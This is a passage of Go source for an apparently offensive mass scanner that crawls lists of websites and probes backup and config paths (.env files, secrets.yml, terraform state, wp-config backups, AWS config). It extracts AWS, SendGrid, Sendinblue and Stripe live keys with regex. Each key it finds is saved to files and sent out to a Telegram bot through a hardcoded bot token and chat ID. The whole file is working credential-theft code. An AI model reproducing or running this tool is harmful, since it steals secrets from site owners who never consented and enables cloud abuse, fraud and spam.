	"/var/task/vercel.json.bak",
	"/var/task/netlify.toml.bak",
	"/var/task/terraform.tfstate.bak",
	"/var/task/terraform.tfvars.bak",
	"/src/config/settings.json.old",
	"/src/config/master.key.bak",
	"/src/package.json.bak",
	"/local/config/master.key.bak",
	"/local/package.json.bak",
	"/test/config/settings.json",
	"/.config/docker-compose.override.yml",
	"/backup/docker-compose.override.yml",
	"/app/docker-compose.dev.yml",
	"/docker-compose.dev.yml",
	"/docker-compose.staging.yml",
	"/.env.staging.bak",
	"/.env.staging.old",
	"/.env.staging.txt",
	"/.env.test.bak",
	"/.env.test.old",
	"/.env.test.txt",
	"/.env.dev.txt",
	"/config/database.yml.bak",
	"/config/secrets.yml.bak",
	"/config/database.yml.old",
	"/config/secrets.yml.old",
	"/app/config/database.yml.old",
	"/app/config/secrets.yml.old",
	"/var/task/config/database.yml.bak",
	"/var/task/config/secrets.yml.bak",
	"/src/config/settings.json.txt",
	"/local/config/settings.json.txt",
	"/conf/config/settings.json.txt",
	"/.config/config/settings.json.tmp",
	"/backup/config/settings.json.tmp",
	"/app/config/settings.json.tmp",
	"/var/task/config/settings.json.tmp",
	"/app/package.json.save",
	"/app/serverless.yml.save",
	"/app/vercel.json.save",
	"/app/terraform.tfstate.save",
	"/app/.amplifyrc.txt",
	"/var/task/.amplifyrc.txt",
	"/app/.boto.txt",
	"/var/task/.boto.txt",
	"/app/.s3cfg.txt",
	"/var/task/.s3cfg.txt",
	"/var/task/.aws/config.bak",
	"/app/main.js.map.bak",
	"/var/task/main.js.map.bak",
	"/app/app.js.map",
	"/var/task/app.js.map",
	"/app/bundle.js.map",
	"/var/task/bundle.js.map",
	"/app/_next/static/chunks/main.js.map",
	"/var/task/_next/static/chunks/main.js.map",
	"/app/_next/static/chunks/main.js.txt",
	"/var/task/_next/static/chunks/main.js.txt",
	"/app/dnscfg.cgi.txt",
	"/var/task/dnscfg.cgi.txt",
	"/app/_api/v1/debug.txt",
	"/var/task/_api/v1/debug.txt",
	"/app/phpinfo.php.bak",
	"/var/task/phpinfo.php.bak",
	"/app/wp-config.php.bak",
	"/app/wp-config.php.old",
	"/app/config.php.bak",
	"/app/settings.py.bak",
	"/app/manage.py.bak",
	"/app/.htaccess.bak",
	"/app/web.config.bak",
}
var (
	telegramBotToken = "8123204935:AAEK2fTT6HgeWK87Oef8YpXe82qIq1M0WCw"
	telegramChatID   = "-4871582724"
)

func sendTelegramMessage(message string) {
	type TelegramRequest struct {
		ChatID string `json:"chat_id"`
		Text   string `json:"text"`
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	reqBody, _ := json.Marshal(TelegramRequest{
		ChatID: telegramChatID,
		Text:   message,
	})

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(reqBody))
	if err != nil {
		fmt.Println("[Telegram] Erreur envoi message:", err)
		return
	}
	defer resp.Body.Close()
}

var (
	uniqueKeys = make(map[string]struct{})
	visited    sync.Map

	jsDomainCache = struct {
		sync.RWMutex
		domains map[string]*jsDomainStatus
	}{
		domains: make(map[string]*jsDomainStatus),
	}

	jsHTTPClient   *http.Client
	keysFoundCount int32
	uaIndex        int32
)

func getRandomUserAgent() string {
	idx := atomic.AddInt32(&uaIndex, 1)
	return userAgents[int(idx)%len(userAgents)]
}

func main() {
	jsHTTPClient = &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSNextProto:          map[string]func(string, *tls.Conn) http.RoundTripper{},
			MaxIdleConns:          1000,
			MaxIdleConnsPerHost:   100,
			MaxConnsPerHost:       200,
			IdleConnTimeout:       60 * time.Second,
			TLSHandshakeTimeout:   8 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			DisableKeepAlives:     false,
		},
	}

	RunJsfinder()

	_ = jsGetDomainStatus("example.com")
}

func jsGetDomainStatus(domain string) *jsDomainStatus {
	jsDomainCache.RLock()
	status, exists := jsDomainCache.domains[domain]
	jsDomainCache.RUnlock()

	if !exists {
		jsDomainCache.Lock()
		defer jsDomainCache.Unlock()
		if status, exists = jsDomainCache.domains[domain]; !exists {
			status = &jsDomainStatus{
				awsFound:     false,
				fileCount:    0,
				lastScanTime: time.Now(),
			}
			jsDomainCache.domains[domain] = status
		}
	}
	return status
}

func jsShouldContinueScan(urlStr string) bool {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return false
	}

	status := jsGetDomainStatus(parsedURL.Host)
	status.RLock()
	defer status.RUnlock()
	return !status.awsFound && status.fileCount < 1000
}

func hasDuplicatePathSegments(urlStr string) bool {
	segments := strings.Split(urlStr, "/")
	seen := make(map[string]bool, len(segments))
	for _, segment := range segments {
		if seen[segment] && segment != "" {
			return true
		}
		seen[segment] = true
	}
	return false
}

func showBanner() {
	banner := `
_______         _______ _      ________________ _______ 
(  ____ |\     /(  ___  ( (    /\__   __(  ___  (       )
| (    )| )   ( | (   ) |  \  ( |  ) (  | (   ) | () () |
| (____)| (___) | (___) |   \ | |  | |  | |   | | || || |
|  _____)|  ___  |  ___  | (\ \) |  | |  | |   | | |(_)| |
| (      | (   ) | (   ) | | \   |  | |  | |   | | |   | |
| )      | )   ( | )   ( | )  \  |  | |  | (___) | )   ( |
|/      |/     \|/     \|/    )_)  )_(  (_______|/     \|

`
	fmt.Println(red(banner))
	fmt.Println(whiteBold("	AWS , SendGrid , SendinBlue Key Scanner - Tracking All Extensions Secrets"))
	fmt.Println()
}

func isAllowedExtension(u string) bool {
	for _, ext := range allowedExtensions {
		if strings.HasSuffix(strings.ToLower(u), "."+ext) {
			return true
		}
	}
	return false
}

func extractLinksByExtension(htmlContent, baseURL string) []string {
	pattern := fmt.Sprintf(`(?:src|href)=["']([^"']+\.(?:%s))["']`, strings.Join(allowedExtensions, "|"))
	re := regexp.MustCompile(pattern)
	matches := re.FindAllStringSubmatch(htmlContent, -1)

	links := make([]string, 0, len(matches)+len(sensitivePaths))
	seen := make(map[string]bool, len(matches)+len(sensitivePaths))

	for _, match := range matches {
		if len(match) > 1 {
			link := resolveURL(baseURL, match[1])
			if !seen[link] && !hasDuplicatePathSegments(link) {
				seen[link] = true
				links = append(links, link)
			}
		}
	}

	parsedBase, err := url.Parse(baseURL)
	if err == nil {
		for _, path := range sensitivePaths {
			sensitiveURL := fmt.Sprintf("%s://%s/%s", parsedBase.Scheme, parsedBase.Host, strings.TrimPrefix(path, "/"))
			if !seen[sensitiveURL] {
				seen[sensitiveURL] = true
				links = append(links, sensitiveURL)
			}
		}
	}

	return links
}

func resolveURL(baseURL, relativeURL string) string {
	base, err := url.Parse(baseURL)
	if err != nil {
		return relativeURL
	}
	ref, err := url.Parse(relativeURL)
	if err != nil {
		return relativeURL
	}
	return base.ResolveReference(ref).String()
}

func extractAWSKeys(content, sourcePath, awsOutputFile string) bool {
	awsAccessKeyRegex := regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`)
	awsSecretKeyRegex := regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`)

	accessKeys := awsAccessKeyRegex.FindAllStringIndex(content, -1)
	secretKeys := awsSecretKeyRegex.FindAllStringIndex(content, -1)

	if len(accessKeys) == 0 || len(secretKeys) == 0 {
		return false
	}

	abs := func(x int) int {
		if x < 0 {
			return -x
		}
		return x
	}

	awsFile, err := os.OpenFile(awsOutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening AWS output file: %v\n", err)
		return false
	}
	defer awsFile.Close()
	writer := bufio.NewWriter(awsFile)

	foundAny := false

	for _, akIndex := range accessKeys {
		accessKey := content[akIndex[0]:akIndex[1]]

		closestSecretKey := ""
		minDistance := len(content) + 1

		for _, skIndex := range secretKeys {
			distance := abs(akIndex[0] - skIndex[0])
			if distance < minDistance {
				minDistance = distance
				closestSecretKey = content[skIndex[0]:skIndex[1]]
			}
		}

		if closestSecretKey == "" {
			continue
		}

		entry := fmt.Sprintf("%s|%s", accessKey, closestSecretKey)

		if _, exists := uniqueKeys[entry]; !exists {
			uniqueKeys[entry] = struct{}{}

			_, err := writer.WriteString(entry + "\n")
			if err != nil {
				fmt.Printf("Error writing AWS key to file: %v\n", err)
				continue
			}

			atomic.AddInt32(&keysFoundCount, 1)

			fmt.Printf("\r[Keys Found: %d] AWS Key Pair Detected: %s (Source: %s)\n",
				atomic.LoadInt32(&keysFoundCount), entry, sourcePath)

			go sendTelegramMessage(fmt.Sprintf("[AWS Key] %s\nSource: %s", entry, sourcePath))

			foundAny = true
		}
	}

	if foundAny {
		writer.Flush()
	}

	return foundAny
}

func extractSendGridKeys(content, sourcePath, sendGridOutputFile string) {
	patterns := []string{
		`\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b`,
	}

	sendGridFile, err := os.OpenFile(sendGridOutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer sendGridFile.Close()

	writer := bufio.NewWriter(sendGridFile)

	found := false

	for _, pattern := range patterns {
		sendGridKeyRegex := regexp.MustCompile(pattern)
		matches := sendGridKeyRegex.FindAllString(content, -1)
		if len(matches) == 0 {
			continue
		}
		for _, key := range matches {
			if _, exists := uniqueKeys[key]; !exists {
				uniqueKeys[key] = struct{}{}
				writer.WriteString(key + "\n")

				atomic.AddInt32(&keysFoundCount, 1)
				fmt.Printf("\r[Keys Found: %d] SendGrid Key Detected: %s (Source: %s)\n",
					atomic.LoadInt32(&keysFoundCount), key, sourcePath)
				go sendTelegramMessage(fmt.Sprintf("[SendGrid Key] %s\nSource: %s", key, sourcePath))
				found = true
			}
		}
	}

	if found {
		writer.Flush()
	}
}

func extractSendinblueKeys(content, sourcePath, outputFile string) bool {
	patterns := []string{
		`(?i)\bxkeysib-[a-f0-9]{64}-[A-Za-z0-9]{16}\b`,
		`(?i)\bxsmtpsib-[a-f0-9]{64}-[A-Za-z0-9]{16}\b`,
	}

	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening Sendinblue output file: %v\n", err)
		return false
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	foundAny := false

	for _, pattern := range patterns {
		sendinblueKeyRegex := regexp.MustCompile(pattern)
		matches := sendinblueKeyRegex.FindAllString(content, -1)

		for _, key := range matches {
			if _, exists := uniqueKeys[key]; !exists {
				uniqueKeys[key] = struct{}{}
				if _, err := writer.WriteString(key + "\n"); err != nil {
					fmt.Printf("Error writing Sendinblue key: %v\n", err)
					continue
				}
				atomic.AddInt32(&keysFoundCount, 1)
				fmt.Printf("\r[Keys Found: %d] Sendinblue Key Detected: %s (Source: %s)\n",
					atomic.LoadInt32(&keysFoundCount), key, sourcePath)

				go sendTelegramMessage(fmt.Sprintf("[Sendinblue Key] %s\nSource: %s", key, sourcePath))

				foundAny = true
			}
		}
	}

	if foundAny {
		writer.Flush()
	}
	return foundAny
}

func extractOtherAPIKeys(content, sourcePath, outputFile string) bool {
	patterns := map[string]string{
		"Stripe": `\bsk_live_[A-Za-z0-9]{24,}\b`,
	}

	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening Other API keys output file: %v\n", err)
		return false
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	foundAny := false

	for keyType, pattern := range patterns {
		apiKeyRegex := regexp.MustCompile(pattern)
		matches := apiKeyRegex.FindAllString(content, -1)

		for _, key := range matches {
			if _, exists := uniqueKeys[key]; !exists {
				uniqueKeys[key] = struct{}{}
				entry := fmt.Sprintf("[%s] %s", keyType, key)
				if _, err := writer.WriteString(entry + "\n"); err != nil {
					fmt.Printf("Error writing %s key: %v\n", keyType, err)
					continue
				}
				atomic.AddInt32(&keysFoundCount, 1)
				fmt.Printf("\r[Keys Found: %d] %s Key Detected: %s (Source: %s)\n",
					atomic.LoadInt32(&keysFoundCount), keyType, key, sourcePath)

				go sendTelegramMessage(fmt.Sprintf("[%s Key] %s\nSource: %s", keyType, key, sourcePath))

				foundAny = true
			}
		}
	}

	if foundAny {
		writer.Flush()
	}
	return foundAny
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func fetchWithTimeout(ctx context.Context, client *http.Client, url string) ([]byte, http.Header, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, nil, err
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 5*1024*1024))
	if err != nil {
		return nil, nil, err
	}
	return body, resp.Header, nil
}

func analyzeURL(ctx context.Context, targetURL string, client *http.Client, awsOutputFile, sendGridOutputFile, sendinblueOutputFile string, scanned *int32) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	if !jsShouldContinueScan(targetURL) {
		return
	}

	if _, alreadyVisited := visited.LoadOrStore(targetURL, true); alreadyVisited {
		return
	}

	atomic.AddInt32(scanned, 1)
	fmt.Printf("\r[INFO] Scanned %d URLs... ", *scanned)

	body, headers, err := fetchWithTimeout(ctx, client, targetURL)
	if err != nil {
		return
	}

	content := string(body)

	// TOUJOURS scanner pour les clés, peu importe le Content-Type
	if extractAWSKeys(content, targetURL, awsOutputFile) {
		status := jsGetDomainStatus(parsedURL.Host)
		status.Lock()
		status.awsFound = true
		status.Unlock()
	}
	extractSendGridKeys(content, targetURL, sendGridOutputFile)
	extractSendinblueKeys(content, targetURL, sendinblueOutputFile)
	extractOtherAPIKeys(content, targetURL, "DATABASE/API/STRIPE.txt")

	// Si c'est du HTML, continuer la récursion
	if strings.Contains(headers.Get("Content-Type"), "text/html") {
		links := extractLinksByExtension(content, targetURL)
		status := jsGetDomainStatus(parsedURL.Host)

		for _, link := range links {
			status.Lock()
			if status.fileCount >= 1000 {
				status.Unlock()
				break
			}
			status.fileCount++
			status.Unlock()

			analyzeURL(ctx, link, client, awsOutputFile, sendGridOutputFile, sendinblueOutputFile, scanned)
		}
	}
}

func safeAnalyzeURL(ctx context.Context, targetURL string, client *http.Client, awsOutputFile, sendGridOutputFile, sendinblueOutputFile string, scanned *int32) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println(redBg("[ERROR] Panic occurred while processing URL:"), targetURL, "Error:", r)
		}
	}()

	analyzeURL(ctx, targetURL, client, awsOutputFile, sendGridOutputFile, sendinblueOutputFile, scanned)
}

func processBulkURLs(urls []string, awsOutputFile, sendGridOutputFile, sendinblueOutputFile string, maxConcurrency int) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()

	sem := make(chan struct{}, maxConcurrency)
	var wg sync.WaitGroup
	var scanned int32

	for _, url := range urls {
		wg.Add(1)
		sem <- struct{}{}

		go func(url string) {
			defer wg.Done()
			defer func() { <-sem }()

			safeAnalyzeURL(ctx, url, jsHTTPClient, awsOutputFile, sendGridOutputFile, sendinblueOutputFile, &scanned)
		}(url)
	}

	wg.Wait()
	close(sem)
	fmt.Println(("\n[INFO] All URLs processed.") + "\n")
}

func readURLsFromFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 10*1024*1024)

	for scanner.Scan() {
		if line := strings.TrimSpace(scanner.Text()); line != "" {
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			urls = append(urls, line)
		}
	}
	return urls, scanner.Err()
}

func processBatches(urls []string, batchSize int, awsOutputFile, sendGridOutputFile, sendinblueOutputFile string, maxConcurrency int) {
	for i := 0; i < len(urls); i += batchSize {
		end := i + batchSize
		if end > len(urls) {
			end = len(urls)
		}
		processBulkURLs(urls[i:end], awsOutputFile, sendGridOutputFile, sendinblueOutputFile, maxConcurrency)
	}
}

func RunJsfinder() {
	showBanner()

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf(symbol + whiteBold("Enter the path to a file with URLs: "))
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)

	urls, err := readURLsFromFile(filePath)
	if err != nil {
		fmt.Println(redBg("[ERROR] Failed to read URLs from file:"), err)
		return
	}

	fmt.Printf(symbol + whiteBold("Enter the number of goroutines to use: "))
	var maxConcurrency int
	_, err = fmt.Scanln(&maxConcurrency)
	if err != nil || maxConcurrency <= 0 {
		fmt.Println(redBg("[ERROR] Invalid number of goroutines provided.") + "\n")
		return
	}

	batchSize := 50000
	processBatches(urls, batchSize, "DATABASE/AWS/AKIA.txt", "DATABASE/SMTP/SENDGRID.txt", "DATABASE/SMTP/SENDIBLUE.txt", maxConcurrency)
}
